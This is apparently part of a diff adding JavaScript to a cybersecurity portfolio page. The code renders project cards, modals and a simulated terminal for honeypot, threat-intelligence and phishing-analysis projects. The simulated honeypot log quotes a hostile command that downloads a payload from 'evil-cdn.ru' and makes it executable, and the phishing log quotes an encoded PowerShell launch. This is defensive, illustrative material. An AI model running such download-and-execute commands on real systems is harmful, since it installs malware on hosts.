+                        "[SYS] Notification dispatched to SOC channel: Alert automation finished in 1.4s."
+                    ]
+                },
+                {
+                    id: "SEC-OP-08",
+                    category: "automation",
+                    title: "Honeypot Deployment & Threat Intelligence",
+                    icon: "antenna",
+                    colorClass: "border-l-blue-500",
+                    colorAccent: "text-blue-400",
+                    bgAccent: "bg-blue-500/10",
+                    description: "The project was fully implemented by me to capture and analyze real-world attacker behavior using a honeypot environment. The purpose of the project was to study brute-force attacks, collect attacker intelligence, and understand malicious behaviors targeting exposed systems.",
+                    workflow: [
+                        { title: "Honeypot Deploy", text: "Deploy active Cowrie SSH honeypots inside cloud networks." },
+                        { title: "Logger Setup", text: "Establish JSON logging matrices to collect keystrokes and credentials." },
+                        { title: "Threat Collection", text: "Log password combinations, executed payloads, and remote commands." },
+                        { title: "Enrich & Trace", text: "Enrich attacker IPs with geolocation databases and threat intelligence." }
+                    ],
+                    skills: [
+                        { name: "Honeypot Architecture", val: 91 },
+                        { name: "Threat Intel Collection", val: 93 },
+                        { name: "OSINT Investigation Tools", val: 90 },
+                        { name: "Attacker Behavior Audits", val: 88 },
+                        { name: "Cloud Infrastructure Eng", val: 86 }
+                    ],
+                    tools: ["Cowrie SSH Decoy", "ELK Analytics Stack", "VirusTotal Integration", "DigitalOcean Cloud", "WHOIS Tools"],
+                    terminalOutputs: [
+                        "[HONEYPOT] Exposing decoy SSH port 22 on public interface...",
+                        "[INTRUSION] Ingress connection log: Source: 42.112.44.88 (Beijing, China)",
+                        "[BRUTEFORCE] Attack credentials attempted: root/admin123, admin/password",
+                        "[SESSION] SSH login accepted (Simulated Decoy Shell Access Enabled)",
+                        "[COMMAND] Attacker inputs parsed: wget http://evil-cdn.ru/payload -O botnet; chmod +x botnet",
+                        "[INTELLIGENCE] Capturing file artifact MD5: a41893... flag: Mirai Variant",
+                        "[ALERT] Attacker infrastructure metadata dispatched to cloud threat feeds."
+                    ]
+                },
+                {
+                    id: "SEC-OP-09",
+                    category: "automation",
+                    title: "Threat Intelligence IOC Research",
+                    icon: "shield-check",
+                    colorClass: "border-l-pink-500",
+                    colorAccent: "text-pink-400",
+                    bgAccent: "bg-pink-500/10",
+                    description: "The project was fully implemented by me to perform threat intelligence research, IOC enrichment, and adversary profiling based on malware campaigns and APT activities. The purpose of the project was to understand how SOC analysts and threat intelligence teams collect, analyze, and correlate Indicators of Compromise (IOCs) to identify emerging cyber threats and attacker behaviors.",
+                    workflow: [
+                        { title: "APT Profiling", text: "Research emerging threat groups and map malware delivery infrastructures." },
+                        { title: "IOC Collection", text: "Extract malicious hashes, dynamic IP arrays, and C2 URLs." },
+                        { title: "Enrich Intel", text: "Enrich indicators using AlienVault OTX, WHOIS lookup, and MISP databases." },
+                        { title: "Watchlist Build", text: "Generate structured IOC watchlists and firewall rules." }
+                    ],
+                    skills: [
+                        { name: "Threat Intelligence Analysis", val: 94 },
+                        { name: "IOC Forensic Enrichment", val: 91 },
+                        { name: "Malware Infrastructure Tracking", val: 90 },
+                        { name: "MITRE ATT&CK Profiling", val: 92 },
+                        { name: "MISP Database Management", val: 85 }
+                    ],
+                    tools: ["VirusTotal Engine", "AlienVault OTX", "WHOIS Intelligence", "MISP Platform", "YARA Pattern Match"],
+                    terminalOutputs: [
+                        "[INTEL_PROFILER] Research Campaign started on APT29 (Cozy Bear) infrastructures...",
+                        "[INGEST] Parsing active phishing C2 nodes published to MISP sharing network.",
+                        "[ANALYSIS] Identified malicious subdomain: updates-internal.microsoft-system.org",
+                        "[ENRICHMENT] WHOIS data reveals registrar proxy: NameSilo (Owner Hidden)",
+                        "[MALWARE_CORRELATION] Correlating known dropper sample hashes using AlienVault pulses.",
+                        "[MITRE] Mapping malicious infrastructure pattern to T1583 (Acquire Infrastructure)",
+                        "[OUTPUT] Formulating block rules for production firewalls and proxy filters."
+                    ]
+                },
+                {
+                    id: "SEC-OP-10",
+                    category: "secops",
+                    title: "Phishing Email & Malware Analysis",
+                    icon: "mail",
+                    colorClass: "border-l-violet-500",
+                    colorAccent: "text-violet-400",
+                    bgAccent: "bg-violet-500/10",
+                    description: "The project was fully implemented by me to analyze phishing emails, malicious attachments, and malware behavior inside a secure sandbox environment. The purpose of the project was to understand phishing investigation workflows, malware execution analysis, and SOC email threat response procedures.",
+                    workflow: [
+                        { title: "Header Audit", text: "Extract and examine suspicious email headers, routing hops, and DKIM/SPF statuses." },
+                        { title: "Detonation Lab", text: "Deliver and run attachment files inside secured interactive VM environments." },
+                        { title: "Execution Track", text: "Track memory states, registry additions, and downstream execution maps." },
+                        { title: "Forensics Out", text: "Isolate indicators of compromise and compile remediation playbooks." }
+                    ],
+                    skills: [
+                        { name: "Email Forensics Operations", val: 93 },
+                        { name: "Malware Behavior Analysis", val: 90 },
+                        { name: "Sandbox Lab Detonation", val: 92 },
+                        { name: "IOC Artifact Extraction", val: 89 },
+                        { name: "Network Forensics Audits", val: 86 }
+                    ],
+                    tools: ["Any.Run Sandbox", "VirtualBox Host", "VirusTotal Integration", "Wireshark PCAP Analyzer", "Outlook Header Tools"],
+                    terminalOutputs: [
+                        "[FORENSICS] Inspecting suspicious phishing artifact: invoice_unpaid.xlsm.lnk",
+                        "[HEADER] Auth Check: SPF=Fail, DKIM=Fail, DMARC=Fail. High spoofing score.",
+                        "[SANDBOX] Detonating malicious LNk sample in secure Any.Run terminal...",
+                        "[PROCESS_MONITOR] xlsm.lnk spawned cmd.exe -> powershell.exe -e JABjAD0AbgBl...",
+                        "[NET] Target process requested payload from remote web server: 45.19.22.112",
+                        "[MALWARE_BEHAVIOR] Excel spreadsheet executing macro containing ransomware dropper.",
+                        "[REPORT] Isolated 4 new indicators of compromise for enterprise SIEM ingestion lists."
+                    ]
+                }
+            ];
+
+            // Filter and Project Grid Initialization
+            const projectsGrid = document.getElementById('projects-grid');
+            const activeTerminalJob = document.getElementById('active-terminal-job');
+            const terminalScreen = document.getElementById('terminal-screen');
+
+            function renderProjects(filter = 'all') {
+                projectsGrid.innerHTML = '';
+
+                const filtered = projectsData.filter(proj => {
+                    if(filter === 'all') return true;
+                    return proj.category === filter;
+                });
+
+                filtered.forEach(proj => {
+                    const card = document.createElement('div');
+                    card.className = `glass-card p-6 border-l-4 ${proj.colorClass} relative transition-all duration-300`;
+                    card.innerHTML = `
+                    <div class="flex items-start justify-between gap-4 mb-4">
+                        <div class="flex items-center gap-3">
+                            <div class="p-2.5 ${proj.bgAccent} ${proj.colorAccent} rounded-xl border border-white/5 shrink-0">
+                                <i data-lucide="${proj.icon}" class="w-5 h-5"></i>
+            </div>
+                            <div>
+                                <div class="flex items-center gap-2 mb-0.5">
+                                    <span class="text-[9px] font-mono text-slate-500 font-bold tracking-widest uppercase">${proj.category}</span>
+                                    <span class="text-[9px] font-mono text-violet-400 font-bold">${proj.id}</span>
+            </div>
+                                <h3 class="text-base font-bold text-white group-hover:text-violet-400 transition-colors">${proj.title}</h3>
+            </div>
+            </div>
+            </div>
+
+                    <p class="text-xs text-slate-400 leading-relaxed mb-4 line-clamp-2">
+                        ${proj.description}
+            </p>
+
+                    <div class="flex flex-wrap gap-1.5 mb-5">
+                        ${proj.skills.slice(0, 3).map(skill => `
+                            <span class="text-[9px] font-mono px-2 py-0.5 bg-slate-900 border border-white/5 rounded text-slate-300">${skill.name}</span>
+                        `).join('')}
+            </div>
+
+                    <!-- Custom Interactive buttons inside each card -->
+                    <div class="flex items-center justify-between pt-3 border-t border-white/5 font-mono text-[10px]">
+                        <button onclick="openProjectModal('${proj.id}')" class="text-slate-400 hover:text-white flex items-center gap-1.5 transition-colors group">
+                            <i data-lucide="eye" class="w-3.5 h-3.5 text-violet-400 group-hover:scale-110 transition-transform"></i> Explore Details
+            </button>
+                        <button onclick="launchSimulation('${proj.id}')" class="px-3 py-1 bg-violet-600/10 hover:bg-violet-600 border border-violet-500/20 hover:border-violet-500 rounded text-violet-400 hover:text-white transition-all flex items-center gap-1">
+                            <i data-lucide="terminal" class="w-3 h-3"></i> Launch Script
+            </button>
+            </div>
+                `;
+                    projectsGrid.appendChild(card);
+                });
+                lucide.createIcons();
+            }
+
+            // Handle Project Filters
+            function filterProjects(category) {
+                // Remove active style from all tabs
+                document.querySelectorAll('#vault-core button').forEach(btn => btn.classList.remove('active-tab'));
+                // Add active style to selected tab
+                document.getElementById(`btn-${category}`).classList.add('active-tab');
+                // Render
+                renderProjects(category);
+            }
+
+            // Simulated Tactical Terminal Typer Engine
+            let activeInterval = null;
+            function launchSimulation(projectId) {
+                const project = projectsData.find(p => p.id === projectId);
+                if(!project) return;
+
+                // Clear any active typewriter loop
+                if(activeInterval) clearInterval(activeInterval);
+
+                // Change active job labels
+                activeTerminalJob.textContent = project.id;
+                terminalScreen.innerHTML = '';
+
+                let lineIndex = 0;
+                const lines = project.terminalOutputs;
+
+                function printLine() {
+                    if (lineIndex < lines.length) {
+                        const outputLine = document.createElement('div');
+                        outputLine.className = 'font-mono text-xs leading-relaxed tracking-wide';
+
+                        // Format output colors based on logs prefix
+                        const text = lines[lineIndex];
+                        if (text.includes('[ALERT]') || text.includes('[CRITICAL]')) {
+                            outputLine.className += ' text-red-400';
+                        } else if (text.includes('[SYS]') || text.includes('[INFO]')) {
+                            outputLine.className += ' text-violet-400';
+                        } else if (text.includes('[ACTION]') || text.includes('[REMEDIATION]')) {
+                            outputLine.className += ' text-emerald-400 font-bold';
+                        } else {
+                            outputLine.className += ' text-slate-300';
+                        }
+
+                        outputLine.innerHTML = `<span class="text-slate-600">></span> ${text}`;
+                        terminalScreen.appendChild(outputLine);
+                        terminalScreen.scrollTop = terminalScreen.scrollHeight;
+                        lineIndex++;
+                    } else {
+                        clearInterval(activeInterval);
+                        activeInterval = null;
+                        // Add finished validation indicator
+                        const doneLine = document.createElement('div');
+                        doneLine.className = 'font-mono text-[10px] text-slate-500 pt-2 border-t border-white/5';
+                        doneLine.textContent = `[PROCESS_TERMINATED] JOB_${project.id} completed. Status: STABLE_HOLD`;
+                        terminalScreen.appendChild(doneLine);
+                        terminalScreen.scrollTop = terminalScreen.scrollHeight;
+                    }
+                }
+
+                // Type initial boot line immediately
+                const initLine = document.createElement('div');
+                initLine.className = 'font-mono text-xs text-slate-500 italic animate-pulse';
+                initLine.textContent = `[BOOTING] Launching virtual playbook session: ${project.id}...`;
+                terminalScreen.appendChild(initLine);
+
+                activeInterval = setInterval(printLine, 1200);
+            }
+
+            function clearTerminal() {
+                if(activeInterval) clearInterval(activeInterval);
+                terminalScreen.innerHTML = `
+                <div class="text-violet-400">[SYS] Ready for Command Injection...</div>
+                <div class="text-slate-400">// Select a project to run live event simulations, execute log parsers, and view detection rules...</div>
+            `;
+                activeTerminalJob.textContent = "NONE";
+            }
+
+            // Deep-Dive Modal Operations
+            const modal = document.getElementById('project-modal');
+            const modalIconContainer = document.getElementById('modal-icon-container');
+            const modalCategory = document.getElementById('modal-category');
+            const modalId = document.getElementById('modal-id');
+            const modalTitle = document.getElementById('modal-title');
+            const modalDescription = document.getElementById('modal-description');
+            const modalWorkflowTimeline = document.getElementById('modal-workflow-timeline');
+            const modalSkills = document.getElementById('modal-skills');
+            const modalTools = document.getElementById('modal-tools');
+            const modalTerminalTrigger = document.getElementById('modal-terminal-trigger');
+
+            function openProjectModal(projectId) {
+                const project = projectsData.find(p => p.id === projectId);
+                if(!project) return;
+
+                // Configure basic details
+                modalCategory.textContent = project.category.toUpperCase();
+                modalId.textContent = `REF: ${project.id}`;
+                modalTitle.textContent = project.title;
+                modalDescription.textContent = project.description;
+
+                // Replace dynamic Icon
+                modalIconContainer.className = `p-3 ${project.bgAccent} ${project.colorAccent} rounded-xl border border-white/5 shrink-0`;
+                modalIconContainer.innerHTML = `<i data-lucide="${project.icon}" class="w-8 h-8"></i>`;
+
+                // Setup workflow lifecycle timeline boxes
+                modalWorkflowTimeline.innerHTML = '';
+                project.workflow.forEach((step, idx) => {
+                    const stepNode = document.createElement('div');
+                    stepNode.className = `p-4 rounded-xl bg-white/5 border border-white/5 relative ${idx < 3 ? 'flow-line' : ''}`;
+                    stepNode.innerHTML = `
+                    <div class="text-[10px] font-mono text-violet-400 mb-1 flex items-center justify-between">
+                        <span>PHASE_0${idx+1}</span>
+                        <i data-lucide="check" class="w-3 h-3 text-emerald-400"></i>
+            </div>
+                    <h4 class="font-bold text-xs text-white mb-1.5">${step.title}</h4>
+                    <p class="text-[10px] text-slate-400 leading-relaxed">${step.text}</p>
+                `;
+                    modalWorkflowTimeline.appendChild(stepNode);
+                });
+
+                // Set up skills list items
+                modalSkills.innerHTML = '';
+                project.skills.forEach(skill => {
+                    const bar = document.createElement('div');
+                    bar.innerHTML = `
+                    <div class="flex justify-between items-center text-xs font-mono mb-1">
+                        <span class="text-slate-300 font-bold">${skill.name}</span>
+                        <span class="text-violet-400">${skill.val}%</span>
+            </div>
+                    <div class="w-full h-1.5 bg-slate-900 rounded-full overflow-hidden border border-white/5">
+                        <div class="h-full bg-gradient-to-r from-violet-500 to-fuchsia-400 rounded-full" style="width: ${skill.val}%"></div>
+            </div>
+                `;
+                    modalSkills.appendChild(bar);
+                });
+
+                // Set up Arsenal listing
+                modalTools.innerHTML = '';
+                project.tools.forEach(tool => {
+                    const toolBadge = document.createElement('div');
+                    toolBadge.className = 'p-2.5 bg-white/5 border border-white/5 rounded-lg flex items-center gap-2.5 text-xs text-slate-300 hover:border-violet-500/30 transition-all';
+                    toolBadge.innerHTML = `
+                    <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i>
+                    <span class="font-medium">${tool}</span>
+                `;
+                    modalTools.appendChild(toolBadge);
+                });
+
+                // Modal terminal redirect action button click
+                modalTerminalTrigger.onclick = () => {
+                    closeProjectModal();
+                    launchSimulation(project.id);
+                    // Scroll smoothly to terminal block layout frame
+                    const terminalDest = document.getElementById('vault-core');
+                    if(terminalDest) {
+                        window.scrollTo({ top: terminalDest.offsetTop - 80, behavior: 'smooth' });
+                    }
+                };
+
+                // Display modal
+                modal.classList.remove('hidden');
+                modal.classList.add('flex');
+                document.body.style.overflow = 'hidden'; // Stop background scrolling
+                lucide.createIcons();
+            }
+
+            function closeProjectModal() {
+                modal.classList.remove('flex');
+                modal.classList.add('hidden');
+                document.body.style.overflow = ''; // Resume background scrolling
+            }
+
+            // Close modal when tapping outside content card
+            modal.addEventListener('click', closeProjectModal);
+
+            // Render projects on page load
+            window.onload = function() {
+                renderProjects('all');
+
+                // Auto-run first project terminal script after 1.5 seconds to greet visitors interactively
+                setTimeout(() => {
+                    launchSimulation('SEC-OP-01');
+                }, 1200);
+            };
+        </script>
+    </body>
+</html>
